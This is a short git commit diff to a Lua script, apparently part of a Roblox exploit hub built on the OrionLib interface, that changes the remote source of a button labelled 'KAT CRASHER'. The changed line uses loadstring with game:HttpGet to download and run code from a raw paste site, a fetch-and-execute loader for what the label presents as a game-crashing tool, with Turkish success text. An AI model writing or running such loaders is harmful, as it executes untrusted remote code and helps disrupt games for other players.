14b9b91260299574bd8a5c19de6d14fcf9cbfe3f
Hakkari Valisi <bdec266@gmail.com>
2024-09-06 18:34:18 +0300

    Update idk.lua

--- idk.lua
+++ idk.lua
@@ -78,7 +78,7 @@ SectionKAT:AddButton({
 SectionKAT:AddButton({
     Name = "KAT CRASHER",
     Callback = function()
-        loadstring(game:HttpGet("https://pastebinp.com/raw/jfR556Kb"))()
+        loadstring(game:HttpGet("https://paste.tc/raw/katsilahkaldr"))()
         OrionLib:MakeNotification({
             Name = "Başarılı!",
             Content = "KAT CRASHER adlı script çalıştırıldı!",
